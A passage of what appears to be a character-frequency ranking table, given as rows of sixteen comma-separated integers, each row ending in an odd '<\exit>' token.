5713,5714,5715,5716,5717,5718,5719,5720,5721,5722,5723,5724,5725,5726,5727,5728,<\exit>
5729,5730,5731,5732,5733,5734,5735,5736,5737,5738,5739,5740,5741,5742,5743,5744,<\exit>
5745,5746,5747,5748,5749,5750,5751,5752,5753,5754,5755,5756,5757,5758,5759,5760,<\exit>
5761,5762,5763,5764,5765,5766,5767,5768,5769,5770,5771,5772,5773,5774,5775,5776,<\exit>
5777,5778,5779,5780,5781,5782,5783,5784,5785,5786,5787,5788,5789,5790,5791,5792,<\exit>
5793,5794,5795,5796,5797,5798,5799,5800,5801,5802,5803,5804,5805,5806,5807,5808,<\exit>
5809,5810,5811,5812,5813,5814,5815,5816,5817,5818,5819,5820,5821,5822,5823,5824,<\exit>
5825,5826,5827,5828,5829,5830,5831,5832,5833,5834,5835,5836,5837,5838,5839,5840,<\exit>
5841,5842,5843,5844,5845,5846,5847,5848,5849,5850,5851,5852,5853,5854,5855,5856,<\exit>
5857,5858,5859,5860,5861,5862,5863,5864,5865,5866,5867,5868,5869,5870,5871,5872,<\exit>
5873,5874,5875,5876,5877,5878,5879,5880,5881,5882,5883,5884,5885,5886,5887,5888,<\exit>
5889,5890,5891,5892,5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904,<\exit>
5905,5906,5907,5908,5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920,<\exit>
5921,5922,5923,5924,5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,5936,<\exit>
5937,5938,5939,5940,5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,5952,<\exit>
5953,5954,5955,5956,5957,5958,5959,5960,5961,5962,5963,5964,5965,5966,5967,5968,<\exit>
5969,5970,5971,5972,5973,5974,5975,5976,5977,5978,5979,5980,5981,5982,5983,5984,<\exit>
5985,5986,5987,5988,5989,5990,5991,5992,5993,5994,5995,5996,5997,5998,5999,6000,<\exit>
6001,6002,6003,6004,6005,6006,6007,6008,6009,6010,6011,6012,6013,6014,6015,6016,<\exit>
6017,6018,6019,6020,6021,6022,6023,6024,6025,6026,6027,6028,6029,6030,6031,6032,<\exit>
6033,6034,6035,6036,6037,6038,6039,6040,6041,6042,6043,6044,6045,6046,6047,6048,<\exit>
6049,6050,6051,6052,6053,6054,6055,6056,6057,6058,6059,6060,6061,6062,6063,6064,<\exit>
6065,6066,6067,6068,6069,6070,6071,6072,6073,6074,6075,6076,6077,6078,6079,6080,<\exit>
6081,6082,6083,6084,6085,6086,6087,6088,6089,6090,6091,6092,6093,6094,6095,6096,<\exit>
6097,6098,6099,6100,6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6111,6112,<\exit>
6113,6114,2044,2060,4621, 997,1235, 473,1186,4622, 920,3378,6115,6116, 379,1108,<\exit>
4313,2657,2735,3934,6117,3809, 636,3233, 573,1026,3693,3435,2974,3300,2298,4105,<\exit>
854,2937,2463, 393,2581,2417, 539, 752,1280,2750,2480, 140,1161, 440, 708,1569,<\exit>
665,2497,1746,1291,1523,3000, 164,1603, 847,1331, 537,1997, 486, 508,1693,2418,<\exit>
1970,2227, 878,1220, 299,1030, 969, 652,2751, 624,1137,3301,2619,  65,3302,2045,<\exit>
1761,1859,3120,1930,3694,3516, 663,1767, 852, 835,3695, 269, 767,2826,2339,1305,<\exit>
896,1150, 770,1616,6118, 506,1502,2075,1012,2519, 775,2520,2975,2340,2938,4314,<\exit>
3028,2086,1224,1943,2286,6119,3072,4315,2240,1273,1987,3935,1557, 175, 597, 985,<\exit>
3517,2419,2521,1416,3029, 585, 938,1931,1007,1052,1932,1685,6120,3379,4316,4623,<\exit>
804, 599,3121,1333,2128,2539,1159,1554,2032,3810, 687,2033,2904, 952, 675,1467,<\exit>
3436,6121,2241,1096,1786,2440,1543,1924, 980,1813,2228, 781,2692,1879, 728,1918,<\exit>
3696,4624, 548,1950,4625,1809,1088,1356,3303,2522,1944, 502, 972, 373, 513,2827,<\exit>
586,2377,2391,1003,1976,1631,6122,2464,1084, 648,1776,4626,2141, 324, 962,2012,<\exit>
2177,2076,1384, 742,2178,1448,1173,1810, 222, 102, 301, 445, 125,2420, 662,2498,<\exit>
277, 200,1476,1165,1068, 224,2562,1378,1446, 450,1880, 659, 791, 582,4627,2939,<\exit>
3936,1516,1274, 555,2099,3697,1020,1389,1526,3380,1762,1723,1787,2229, 412,2114,<\exit>
1900,2392,3518, 512,2597, 427,1925,2341,3122,1653,1686,2465,2499, 697, 330, 273,<\exit>
380,2162, 951, 832, 780, 991,1301,3073, 965,2270,3519, 668,2523,2636,1286, 535,<\exit>
1407, 518, 671, 957,2658,2378, 267, 611,2197,3030,6123, 248,2299, 967,1799,2356,<\exit>
850,1418,3437,1876,1256,1480,2828,1718,6124,6125,1755,1664,2405,6126,4628,2879,<\exit>
2829, 499,2179, 676,4629, 557,2329,2214,2090, 325,3234, 464, 811,3001, 992,2342,<\exit>
2481,1232,1469, 303,2242, 466,1070,2163, 603,1777,2091,4630,2752,4631,2714, 322,<\exit>
2659,1964,1768, 481,2188,1463,2330,2857,3600,2092,3031,2421,4632,2318,2070,1849,<\exit>
2598,4633,1302,2254,1668,1701,2422,3811,2905,3032,3123,2046,4106,1763,1694,4634,<\exit>
1604, 943,1724,1454, 917, 868,2215,1169,2940, 552,1145,1800,1228,1823,1955, 316,<\exit>
1080,2510, 361,1807,2830,4107,2660,3381,1346,1423,1134,4108,6127, 541,1263,1229,<\exit>
1148,2540, 545, 465,1833,2880,3438,1901,3074,2482, 816,3937, 713,1788,2500, 122,<\exit>
1575, 195,1451,2501,1111,6128, 859, 374,1225,2243,2483,4317, 390,1033,3439,3075,<\exit>
2524,1687, 266, 793,1440,2599, 946, 779, 802, 507, 897,1081, 528,2189,1292, 711,<\exit>
1866,1725,1167,1640, 753, 398,2661,1053, 246, 348,4318, 137,1024,3440,1600,2077,<\exit>
2129, 825,4319, 698, 238, 521, 187,2300,1157,2423,1641,1605,1464,1610,1097,2541,<\exit>
1260,1436, 759,2255,1814,2150, 705,3235, 409,2563,3304, 561,3033,2005,2564, 726,<\exit>
1956,2343,3698,4109, 949,3812,3813,3520,1669, 653,1379,2525, 881,2198, 632,2256,<\exit>
1027, 778,1074, 733,1957, 514,1481,2466, 554,2180, 702,3938,1606,1017,1398,6129,<\exit>
1380,3521, 921, 993,1313, 594, 449,1489,1617,1166, 768,1426,1360, 495,1794,3601,<\exit>
1177,3602,1170,4320,2344, 476, 425,3167,4635,3168,1424, 401,2662,1171,3382,1998,<\exit>
1089,4110, 477,3169, 474,6130,1909, 596,2831,1842, 494, 693,1051,1028,1207,3076,<\exit>
606,2115, 727,2790,1473,1115, 743,3522, 630, 805,1532,4321,2021, 366,1057, 838,<\exit>
684,1114,2142,4322,2050,1492,1892,1808,2271,3814,2424,1971,1447,1373,3305,1090,<\exit>
1536,3939,3523,3306,1455,2199, 336, 369,2331,1035, 584,2393, 902, 718,2600,6131,<\exit>
2753, 463,2151,1149,1611,2467, 715,1308,3124,1268, 343,1413,3236,1517,1347,2663,<\exit>
2093,3940,2022,1131,1553,2100,2941,1427,3441,2942,1323,2484,6132,1980, 872,2368,<\exit>
2441,2943, 320,2369,2116,1082, 679,1933,3941,2791,3815, 625,1143,2023, 422,2200,<\exit>
3816,6133, 730,1695, 356,2257,1626,2301,2858,2637,1627,1778, 937, 883,2906,2693,<\exit>
3002,1769,1086, 400,1063,1325,3307,2792,4111,3077, 456,2345,1046, 747,6134,1524,<\exit>
884,1094,3383,1474,2164,1059, 974,1688,2181,2258,1047, 345,1665,1187, 358, 875,<\exit>
3170, 305, 660,3524,2190,1334,1135,3171,1540,1649,2542,1527, 927, 968,2793, 885,<\exit>
1972,1850, 482, 500,2638,1218,1109,1085,2543,1654,2034, 876,  78,2287,1482,1277,<\exit>
861,1675,1083,1779, 724,2754, 454, 397,1132,1612,2332, 893, 672,1237, 257,2259,<\exit>
2370, 135,3384, 337,2244, 547, 352, 340, 709,2485,1400, 788,1138,2511, 540, 772,<\exit>
1682,2260,2272,2544,2013,1843,1902,4636,1999,1562,2288,4637,2201,1403,1533, 407,<\exit>
576,3308,1254,2071, 978,3385, 170, 136,1201,3125,2664,3172,2394, 213, 912, 873,<\exit>
3603,1713,2202, 699,3604,3699, 813,3442, 493, 531,1054, 468,2907,1483, 304, 281,<\exit>
4112,1726,1252,2094, 339,2319,2130,2639, 756,1563,2944, 748, 571,2976,1588,2425,<\exit>
2715,1851,1460,2426,1528,1392,1973,3237, 288,3309, 685,3386, 296, 892,2716,2216,<\exit>
1570,2245, 722,1747,2217, 905,3238,1103,6135,1893,1441,1965, 251,1805,2371,3700,<\exit>
2601,1919,1078,  75,2182,1509,1592,1270,2640,4638,2152,6136,3310,3817, 524, 706,<\exit>
1075, 292,3818,1756,2602, 317,  98,3173,3605,3525,1844,2218,3819,2502, 814, 567,<\exit>
385,2908,1534,6137, 534,1642,3239, 797,6138,1670,1529, 953,4323, 188,1071, 538,<\exit>
178, 729,3240,2109,1226,1374,2000,2357,2977, 731,2468,1116,2014,2051,6139,1261,<\exit>
1593, 803,2859,2736,3443, 556, 682, 823,1541,6140,1369,2289,1706,2794, 845, 462,<\exit>
2603,2665,1361, 387, 162,2358,1740, 739,1770,1720,1304,1401,3241,1049, 627,1571,<\exit>
2427,3526,1877,3942,1852,1500, 431,1910,1503, 677, 297,2795, 286,1433,1038,1198,<\exit>
2290,1133,1596,4113,4639,2469,1510,1484,3943,6141,2442, 108, 712,4640,2372, 866,<\exit>
3701,2755,3242,1348, 834,1945,1408,3527,2395,3243,1811, 824, 994,1179,2110,1548,<\exit>
1453, 790,3003, 690,4324,4325,2832,2909,3820,1860,3821, 225,1748, 310, 346,1780,<\exit>
2470, 821,1993,2717,2796, 828, 877,3528,2860,2471,1702,2165,2910,2486,1789, 453,<\exit>
359,2291,1676,  73,1164,1461,1127,3311, 421, 604, 314,1037, 589, 116,2487, 737,<\exit>
837,1180, 111, 244, 735,6142,2261,1861,1362, 986, 523, 418, 581,2666,3822, 103,<\exit>
855, 503,1414,1867,2488,1091, 657,1597, 979, 605,1316,4641,1021,2443,2078,2001,<\exit>
1209,  96, 587,2166,1032, 260,1072,2153, 173,  94, 226,3244, 819,2006,4642,4114,<\exit>
2203, 231,1744, 782,  97,2667, 786,3387, 887, 391, 442,2219,4326,1425,6143,2694,<\exit>
633,1544,1202, 483,2015, 592,2052,1958,2472,1655, 419, 129,4327,3444,3312,1714,<\exit>
1257,3078,4328,1518,1098, 865,1310,1019,1885,1512,1734, 469,2444, 148, 773, 436,<\exit>
1815,1868,1128,1055,4329,1245,2756,3445,2154,1934,1039,4643, 579,1238, 932,2320,<\exit>
353, 205, 801, 115,2428, 944,2321,1881, 399,2565,1211, 678, 766,3944, 335,2101,<\exit>
1459,1781,1402,3945,2737,2131,1010, 844, 981,1326,1013, 550,1816,1545,2620,1335,<\exit>
1008, 371,2881, 936,1419,1613,3529,1456,1395,2273,1834,2604,1317,2738,2503, 416,<\exit>
1643,4330, 806,1126, 229, 591,3946,1314,1981,1576,1837,1666, 347,1790, 977,3313,<\exit>
764,2861,1853, 688,2429,1920,1462,  77, 595, 415,2002,3034, 798,1192,4115,6144,<\exit>
2978,4331,3035,2695,2582,2072,2566, 430,2430,1727, 842,1396,3947,3702, 613, 377,<\exit>
278, 236,1417,3388,3314,3174, 757,1869, 107,3530,6145,1194, 623,2262, 207,1253,<\exit>
2167,3446,3948, 492,1117,1935, 536,1838,2757,1246,4332, 696,2095,2406,1393,1572,<\exit>
3175,1782, 583, 190, 253,1390,2230, 830,3126,3389, 934,3245,1703,1749,2979,1870,<\exit>
2545,1656,2204, 869,2346,4116,3176,1817, 496,1764,4644, 942,1504, 404,1903,1122,<\exit>
1580,3606,2945,1022, 515, 372,1735, 955,2431,3036,6146,2797,1110,2302,2798, 617,<\exit>
6147, 441, 762,1771,3447,3607,3608,1904, 840,3037,  86, 939,1385, 572,1370,2445,<\exit>
1336, 114,3703, 898, 294, 203,3315, 703,1583,2274, 429, 961,4333,1854,1951,3390,<\exit>
2373,3704,4334,1318,1381, 966,1911,2322,1006,1155, 309, 989, 458,2718,1795,1372,<\exit>
1203, 252,1689,1363,3177, 517,1936, 168,1490, 562, 193,3823,1042,4117,1835, 551,<\exit>
470,4645, 395, 489,3448,1871,1465,2583,2641, 417,1493, 279,1295, 511,1236,1119,<\exit>
72,1231,1982,1812,3004, 871,1564, 984,3449,1667,2696,2096,4646,2347,2833,1673,<\exit>
3609, 695,3246,2668, 807,1183,4647, 890, 388,2333,1801,1457,2911,1765,1477,1031,<\exit>
3316,3317,1278,3391,2799,2292,2526, 163,3450,4335,2669,1404,1802,6148,2323,2407,<\exit>
1584,1728,1494,1824,1269, 298, 909,3318,1034,1632, 375, 776,1683,2061, 291, 210,<\exit>
1123, 809,1249,1002,2642,3038, 206,1011,2132, 144, 975, 882,1565, 342, 667, 754,<\exit>
1442,2143,1299,2303,2062, 447, 626,2205,1221,2739,2912,1144,1214,2206,2584, 760,<\exit>
1715, 614, 950,1281,2670,2621, 810, 577,1287,2546,4648, 242,2168, 250,2643, 691,<\exit>
123,2644, 647, 313,1029, 689,1357,2946,1650, 216, 771,1339,1306, 808,2063, 549,<\exit>
913,1371,2913,2914,6149,1466,1092,1174,1196,1311,2605,2396,1783,1796,3079, 406,<\exit>
2671,2117,3949,4649, 487,1825,2220,6150,2915, 448,2348,1073,6151,2397,1707, 130,<\exit>
900,1598, 329, 176,1959,2527,1620,6152,2275,4336,3319,1983,2191,3705,3610,2155,<\exit>
3706,1912,1513,1614,6153,1988, 646, 392,2304,1589,3320,3039,1826,1239,1352,1340,<\exit>
2916, 505,2567,1709,1437,2408,2547, 906,6154,2672, 384,1458,1594,1100,1329, 710,<\exit>
423,3531,2064,2231,2622,1989,2673,1087,1882, 333, 841,3005,1296,2882,2379, 580,<\exit>
1937,1827,1293,2585, 601, 574, 249,1772,4118,2079,1120, 645, 901,1176,1690, 795,<\exit>
2207, 478,1434, 516,1190,1530, 761,2080, 930,1264, 355, 435,1552, 644,1791, 987,<\exit>
220,1364,1163,1121,1538, 306,2169,1327,1222, 546,2645, 218, 241, 610,1704,3321,<\exit>
1984,1839,1966,2528, 451,6155,2586,3707,2568, 907,3178, 254,2947, 186,1845,4650,<\exit>
745, 432,1757, 428,1633, 888,2246,2221,2489,3611,2118,1258,1265, 956,3127,1784,<\exit>
4337,2490, 319, 510, 119, 457,3612, 274,2035,2007,4651,1409,3128, 970,2758, 590,<\exit>
2800, 661,2247,4652,2008,3950,1420,1549,3080,3322,3951,1651,1375,2111, 485,2491,<\exit>
1429,1156,6156,2548,2183,1495, 831,1840,2529,2446, 501,1657, 307,1894,3247,1341,<\exit>
666, 899,2156,1539,2549,1559, 886, 349,2208,3081,2305,1736,3824,2170,2759,1014,<\exit>
1913,1386, 542,1397,2948, 490, 368, 716, 362, 159, 282,2569,1129,1658,1288,1750,<\exit>
2674, 276, 649,2016, 751,1496, 658,1818,1284,1862,2209,2087,2512,3451, 622,2834,<\exit>
376, 117,1060,2053,1208,1721,1101,1443, 247,1250,3179,1792,3952,2760,2398,3953,<\exit>
6157,2144,3708, 446,2432,1151,2570,3452,2447,2761,2835,1210,2448,3082, 424,2222,<\exit>
1251,2449,2119,2836, 504,1581,4338, 602, 817, 857,3825,2349,2306, 357,3826,1470,<\exit>
1883,2883, 255, 958, 929,2917,3248, 302,4653,1050,1271,1751,2307,1952,1430,2697,<\exit>
2719,2359, 354,3180, 777, 158,2036,4339,1659,4340,4654,2308,2949,2248,1146,2232,<\exit>
3532,2720,1696,2623,3827,6158,3129,1550,2698,1485,1297,1428, 637, 931,2721,2145,<\exit>
914,2550,2587,  81,2450, 612, 827,2646,1242,4655,1118,2884, 472,1855,3181,3533,<\exit>
3534, 569,1353,2699,1244,1758,2588,4119,2009,2762,2171,3709,1312,1531,6159,1152,<\exit>
1938, 134,1830, 471,3710,2276,1112,1535,3323,3453,3535, 982,1337,2950, 488, 826,<\exit>
674,1058,1628,4120,2017, 522,2399, 211, 568,1367,3454, 350, 293,1872,1139,3249,<\exit>
1399,1946,3006,1300,2360,3324, 588, 736,6160,2606, 744, 669,3536,3828,6161,1358,<\exit>
199, 723, 848, 933, 851,1939,1505,1514,1338,1618,1831,4656,1634,3613, 443,2740,<\exit>
3829, 717,1947, 491,1914,6162,2551,1542,4121,1025,6163,1099,1223, 198,3040,2722,<\exit>
370, 410,1905,2589, 998,1248,3182,2380, 519,1449,4122,1710, 947, 928,1153,4341,<\exit>
2277, 344,2624,1511, 615, 105, 161,1212,1076,1960,3130,2054,1926,1175,1906,2473,<\exit>
414,1873,2801,6164,2309, 315,1319,3325, 318,2018,2146,2157, 963, 631, 223,4342,<\exit>
4343,2675, 479,3711,1197,2625,3712,2676,2361,6165,4344,4123,6166,2451,3183,1886,<\exit>
2184,1674,1330,1711,1635,1506, 799, 219,3250,3083,3954,1677,3713,3326,2081,3614,<\exit>
1652,2073,4657,1147,3041,1752, 643,1961, 147,1974,3955,6167,1716,2037, 918,3007,<\exit>
1994, 120,1537, 118, 609,3184,4345, 740,3455,1219, 332,1615,3830,6168,1621,2980,<\exit>
1582, 783, 212, 553,2350,3714,1349,2433,2082,4124, 889,6169,2310,1275,1410, 973,<\exit>
166,1320,3456,1797,1215,3185,2885,1846,2590,2763,4658, 629, 822,3008, 763, 940,<\exit>
1990,2862, 439,2409,1566,1240,1622, 926,1282,1907,2764, 654,2210,1607, 327,1130,<\exit>
3956,1678,1623,6170,2434,2192, 686, 608,3831,3715, 903,3957,3042,6171,2741,1522,<\exit>
1915,1105,1555,2552,1359, 323,3251,4346,3457, 738,1354,2553,2311,2334,1828,2003,<\exit>
3832,1753,2351,1227,6172,1887,4125,1478,6173,2410,1874,1712,1847, 520,1204,2607,<\exit>
264,4659, 836,2677,2102, 600,4660,3833,2278,3084,6174,4347,3615,1342, 640, 532,<\exit>
543,2608,1888,2400,2591,1009,4348,1497, 341,1737,3616,2723,1394, 529,3252,1321,<\exit>
983,4661,1515,2120, 971,2592, 924, 287,1662,3186,4349,2700,4350,1519, 908,1948,<\exit>
2452, 156, 796,1629,1486,2223,2055, 694,4126,1259,1036,3392,1213,2249,2742,1889,<\exit>
1230,3958,1015, 910, 408, 559,3617,4662, 746, 725, 935,4663,3959,3009,1289, 563,<\exit>
867,4664,3960,1567,2981,2038,2626, 988,2263,2381,4351, 143,2374, 704,1895,6175,<\exit>
1188,3716,2088, 673,3085,2362,4352, 484,1608,1921,2765,2918, 215, 904,3618,3537,<\exit>
894, 509, 976,3043,2701,3961,4353,2837,2982, 498,6176,6177,1102,3538,1332,3393,<\exit>
1487,1636,1637, 233, 245,3962, 383, 650, 995,3044, 460,1520,1206,2352, 749,3327,<\exit>
530, 700, 389,1438,1560,1773,3963,2264, 719,2951,2724,3834, 870,1832,1644,1000,<\exit>
839,2474,3717, 197,1630,3394, 365,2886,3964,1285,2133, 734, 922, 818,1106, 732,<\exit>
480,2083,1774,3458, 923,2279,1350, 221,3086,  85,2233,2234,3835,1585,3010,2147,<\exit>
1387,1705,2382,1619,2475, 133, 239,2802,1991,1016,2084,2383, 411,2838,1113, 651,<\exit>
1985,1160,3328, 990,1863,3087,1048,1276,2647, 265,2627,1599,3253,2056, 150, 638,<\exit>
2019, 656, 853, 326,1479, 680,1439,4354,1001,1759, 413,3459,3395,2492,1431, 459,<\exit>
4355,1125,3329,2265,1953,1450,2065,2863, 849, 351,2678,3131,3254,3255,1104,1577,<\exit>
227,1351,1645,2453,2193,1421,2887, 812,2121, 634,  95,2435, 201,2312,4665,1646,<\exit>
1671,2743,1601,2554,2702,2648,2280,1315,1366,2089,3132,1573,3718,3965,1729,1189,<\exit>
328,2679,1077,1940,1136, 558,1283, 964,1195, 621,2074,1199,1743,3460,3619,1896,<\exit>
1916,1890,3836,2952,1154,2112,1064, 862, 378,3011,2066,2113,2803,1568,2839,6178,<\exit>
3088,2919,1941,1660,2004,1992,2194, 142, 707,1590,1708,1624,1922,1023,1836,1233,<\exit>
1004,2313, 789, 741,3620,6179,1609,2411,1200,4127,3719,3720,4666,2057,3721, 593,<\exit>
2840, 367,2920,1878,6180,3461,1521, 628,1168, 692,2211,2649, 300, 720,2067,2571,<\exit>
2953,3396, 959,2504,3966,3539,3462,1977, 701,6181, 954,1043, 800, 681, 183,3722,<\exit>
1803,1730,3540,4128,2103, 815,2314, 174, 467, 230,2454,1093,2134, 755,3541,3397,<\exit>
1141,1162,6182,1738,2039, 270,3256,2513,1005,1647,2185,3837, 858,1679,1897,1719,<\exit>
2954,2324,1806, 402, 670, 167,4129,1498,2158,2104, 750,6183, 915, 189,1680,1551,<\exit>
455,4356,1501,2455, 405,1095,2955, 338,1586,1266,1819, 570, 641,1324, 237,1556,<\exit>
2650,1388,3723,6184,1368,2384,1343,1978,3089,2436, 879,3724, 792,1191, 758,3012,<\exit>
1411,2135,1322,4357, 240,4667,1848,3725,1574,6185, 420,3045,1546,1391, 714,4358,<\exit>
1967, 941,1864, 863, 664, 426, 560,1731,2680,1785,2864,1949,2363, 403,3330,1415,<\exit>
1279,2136,1697,2335, 204, 721,2097,3838,  90,6186,2085,2505, 191,3967, 124,2148,<\exit>
1376,1798,1178,1107,1898,1405, 860,4359,1243,1272,2375,2983,1558,2456,1638, 113,<\exit>
3621, 578,1923,2609, 880, 386,4130, 784,2186,2266,1422,2956,2172,1722, 497, 263,<\exit>
2514,1267,2412,2610, 177,2703,3542, 774,1927,1344, 616,1432,1595,1018, 172,4360,<\exit>
2325, 911,4361, 438,1468,3622, 794,3968,2024,2173,1681,1829,2957, 945, 895,3090,<\exit>
575,2212,2476, 475,2401,2681, 785,2744,1745,2293,2555,1975,3133,2865, 394,4668,<\exit>
3839, 635,4131, 639, 202,1507,2195,2766,1345,1435,2572,3726,1908,1184,1181,2457,<\exit>
3727,3134,4362, 843,2611, 437, 916,4669, 234, 769,1884,3046,3047,3623, 833,6187,<\exit>
1639,2250,2402,1355,1185,2010,2047, 999, 525,1732,1290,1488,2612, 948,1578,3728,<\exit>
2413,2477,1216,2725,2159, 334,3840,1328,3624,2921,1525,4132, 564,1056, 891,4363,<\exit>
1444,1698,2385,2251,3729,1365,2281,2235,1717,6188, 864,3841,2515, 444, 527,2767,<\exit>
2922,3625, 544, 461,6189, 566, 209,2437,3398,2098,1065,2068,3331,3626,3257,2137,<\exit>
2138,2122,3730,2888,1995,1820,1044,6190,6191,6192,6193,6194,6195,6196,6197,6198,<\exit>
6199,6200,6201,6202,6203,6204,6205,4670,6206,6207,6208,6209,6210,6211,6212,6213,<\exit>
6214,6215,6216,6217,6218,6219,6220,6221,6222,6223,6224,6225,6226,6227,6228,6229,<\exit>
6230,6231,6232,6233,6234,6235,6236,6237,3187,6238,6239,3969,6240,6241,6242,6243,<\exit>
6244,4671,6245,6246,4672,6247,6248,4133,6249,6250,4364,6251,2923,2556,2613,4673,<\exit>
4365,3970,6252,6253,6254,6255,4674,6256,6257,6258,2768,2353,4366,4675,4676,3188,<\exit>
4367,3463,6259,4134,4677,4678,6260,2267,6261,3842,3332,4368,3543,6262,6263,6264,<\exit>
3013,1954,1928,4135,4679,6265,6266,2478,3091,6267,4680,4369,6268,6269,1699,6270,<\exit>
3544,4136,4681,6271,4137,6272,4370,2804,6273,6274,2593,3971,3972,4682,6275,2236,<\exit>
4683,6276,6277,4684,6278,6279,4138,3973,4685,6280,6281,3258,6282,6283,6284,6285,<\exit>
3974,4686,2841,3975,6286,6287,3545,6288,6289,4139,4687,4140,6290,4141,6291,4142,<\exit>
6292,6293,3333,6294,6295,6296,4371,6297,3399,6298,6299,4372,3976,6300,6301,6302,<\exit>
4373,6303,6304,3843,3731,6305,4688,4374,6306,6307,3259,2294,6308,3732,2530,4143,<\exit>
6309,4689,6310,6311,6312,3048,6313,6314,4690,3733,2237,6315,6316,2282,3334,6317,<\exit>
6318,3844,6319,6320,4691,6321,3400,4692,6322,4693,6323,3049,6324,4375,6325,3977,<\exit>
6326,6327,6328,3546,6329,4694,3335,6330,4695,4696,6331,6332,6333,6334,4376,3978,<\exit>
6335,4697,3979,4144,6336,3980,4698,6337,6338,6339,6340,6341,4699,4700,4701,6342,<\exit>
6343,4702,6344,6345,4703,6346,6347,4704,6348,4705,4706,3135,6349,4707,6350,4708,<\exit>
6351,4377,6352,4709,3734,4145,6353,2506,4710,3189,6354,3050,4711,3981,6355,3547,<\exit>
3014,4146,4378,3735,2651,3845,3260,3136,2224,1986,6356,3401,6357,4712,2594,3627,<\exit>
3137,2573,3736,3982,4713,3628,4714,4715,2682,3629,4716,6358,3630,4379,3631,6359,<\exit>
6360,6361,3983,6362,6363,6364,6365,4147,3846,4717,6366,6367,3737,2842,6368,4718,<\exit>
2628,6369,3261,6370,2386,6371,6372,3738,3984,4719,3464,4720,3402,6373,2924,3336,<\exit>
4148,2866,6374,2805,3262,4380,2704,2069,2531,3138,2806,2984,6375,2769,6376,4721,<\exit>
4722,3403,6377,6378,3548,6379,6380,2705,3092,1979,4149,2629,3337,2889,6381,3338,<\exit>
4150,2557,3339,4381,6382,3190,3263,3739,6383,4151,4723,4152,2558,2574,3404,3191,<\exit>
6384,6385,4153,6386,4724,4382,6387,6388,4383,6389,6390,4154,6391,4725,3985,6392,<\exit>
3847,4155,6393,6394,6395,6396,6397,3465,6398,4384,6399,6400,6401,6402,6403,6404,<\exit>
4156,6405,6406,6407,6408,2123,6409,6410,2326,3192,4726,6411,6412,6413,6414,4385,<\exit>
4157,6415,6416,4158,6417,3093,3848,6418,3986,6419,6420,3849,6421,6422,6423,4159,<\exit>
6424,6425,4160,6426,3740,6427,6428,6429,6430,3987,6431,4727,6432,2238,6433,6434,<\exit>
4386,3988,6435,6436,3632,6437,6438,2843,6439,6440,6441,6442,3633,6443,2958,6444,<\exit>
6445,3466,6446,2364,4387,3850,6447,4388,2959,3340,6448,3851,6449,4728,6450,6451,<\exit>
3264,4729,6452,3193,6453,4389,4390,2706,3341,4730,6454,3139,6455,3194,6456,3051,<\exit>
2124,3852,1602,4391,4161,3853,1158,3854,4162,3989,4392,3990,4731,4732,4393,2040,<\exit>
4163,4394,3265,6457,2807,3467,3855,6458,6459,6460,3991,3468,4733,4734,6461,3140,<\exit>
2960,6462,4735,6463,6464,6465,6466,4736,4737,4738,4739,6467,6468,4164,2403,3856,<\exit>
6469,6470,2770,2844,6471,4740,6472,6473,6474,6475,6476,6477,6478,3195,6479,4741,<\exit>
4395,6480,2867,6481,4742,2808,6482,2493,4165,6483,6484,6485,6486,2295,4743,6487,<\exit>
6488,6489,3634,6490,6491,6492,6493,6494,6495,6496,2985,4744,6497,6498,4745,6499,<\exit>
6500,2925,3141,4166,6501,6502,4746,6503,6504,4747,6505,6506,6507,2890,6508,6509,<\exit>
6510,6511,6512,6513,6514,6515,6516,6517,6518,6519,3469,4167,6520,6521,6522,4748,<\exit>
4396,3741,4397,4749,4398,3342,2125,4750,6523,4751,4752,4753,3052,6524,2961,4168,<\exit>
6525,4754,6526,4755,4399,2926,4169,6527,3857,6528,4400,4170,6529,4171,6530,6531,<\exit>
2595,6532,6533,6534,6535,3635,6536,6537,6538,6539,6540,6541,6542,4756,6543,6544,<\exit>
6545,6546,6547,6548,4401,6549,6550,6551,6552,4402,3405,4757,4403,6553,6554,6555,<\exit>
4172,3742,6556,6557,6558,3992,3636,6559,6560,3053,2726,6561,3549,4173,3054,4404,<\exit>
6562,6563,3993,4405,3266,3550,2809,4406,6564,6565,6566,4758,4759,6567,3743,6568,<\exit>
4760,3744,4761,3470,6569,6570,6571,4407,6572,3745,4174,6573,4175,2810,4176,3196,<\exit>
4762,6574,4177,6575,6576,2494,2891,3551,6577,6578,3471,6579,4408,6580,3015,3197,<\exit>
6581,3343,2532,3994,3858,6582,3094,3406,4409,6583,2892,4178,4763,4410,3016,4411,<\exit>
6584,3995,3142,3017,2683,6585,4179,6586,6587,4764,4412,6588,6589,4413,6590,2986,<\exit>
6591,2962,3552,6592,2963,3472,6593,6594,4180,4765,6595,6596,2225,3267,4414,6597,<\exit>
3407,3637,4766,6598,6599,3198,6600,4415,6601,3859,3199,6602,3473,4767,2811,4416,<\exit>
1856,3268,3200,2575,3996,3997,3201,4417,6603,3095,2927,6604,3143,6605,2268,6606,<\exit>
3998,3860,3096,2771,6607,6608,3638,2495,4768,6609,3861,6610,3269,2745,4769,4181,<\exit>
3553,6611,2845,3270,6612,6613,6614,3862,6615,6616,4770,4771,6617,3474,3999,4418,<\exit>
4419,6618,3639,3344,6619,4772,4182,6620,2126,6621,6622,6623,4420,4773,6624,3018,<\exit>
6625,4774,3554,6626,4183,2025,3746,6627,4184,2707,6628,4421,4422,3097,1775,4185,<\exit>
3555,6629,6630,2868,6631,6632,4423,6633,6634,4424,2414,2533,2928,6635,4186,2387,<\exit>
6636,4775,6637,4187,6638,1891,4425,3202,3203,6639,6640,4776,6641,3345,6642,6643,<\exit>
3640,6644,3475,3346,3641,4000,6645,3144,6646,3098,2812,4188,3642,3204,6647,3863,<\exit>
3476,6648,3864,6649,4426,4001,6650,6651,6652,2576,6653,4189,4777,6654,6655,6656,<\exit>
2846,6657,3477,3205,4002,6658,4003,6659,3347,2252,6660,6661,6662,4778,6663,6664,<\exit>
6665,6666,6667,6668,6669,4779,4780,2048,6670,3478,3099,6671,3556,3747,4004,6672,<\exit>
6673,6674,3145,4005,3748,6675,6676,6677,6678,6679,3408,6680,6681,6682,6683,3206,<\exit>
3207,6684,6685,4781,4427,6686,4782,4783,4784,6687,6688,6689,4190,6690,6691,3479,<\exit>
6692,2746,6693,4428,6694,6695,6696,6697,6698,6699,4785,6700,6701,3208,2727,6702,<\exit>
